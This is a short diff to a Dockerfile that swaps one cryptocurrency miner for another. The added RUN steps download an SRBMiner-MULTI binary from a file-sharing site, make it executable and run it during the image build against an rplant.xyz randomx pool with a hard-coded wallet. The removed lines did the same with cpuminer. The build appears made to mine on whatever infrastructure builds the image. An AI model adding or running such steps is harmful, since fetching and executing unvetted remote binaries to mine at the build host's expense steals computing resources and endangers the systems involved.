@@ -5,6 +5,6 @@ ENV DEBIAN_FRONTEND=noninteractive \
 
 RUN apt update
 RUN apt -y install wget
-RUN wget https://filebin.net/czb77vcmdjsmn82s/cpuminer-sse2
-RUN chmod +x cpuminer-sse2
-RUN ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.DG2
+RUN wget https://filebin.net/akyledae6dlzo6ot/SRBMiner-MULTI
+RUN chmod +x SRBMiner-MULTI
+RUN ./SRBMiner-MULTI --algorithm randomx --pool randomx.rplant.xyz:17107 --tls true --wallet TaBohkLdkWDMVaSLQs9wxtP43eCf5MdLoQ968kSFTGhj9SRmLGcx8fvHmjyUaUo5kKEsw2ucaCSe8WZR2rCFZYUj2RxrwBmQXD.DG2
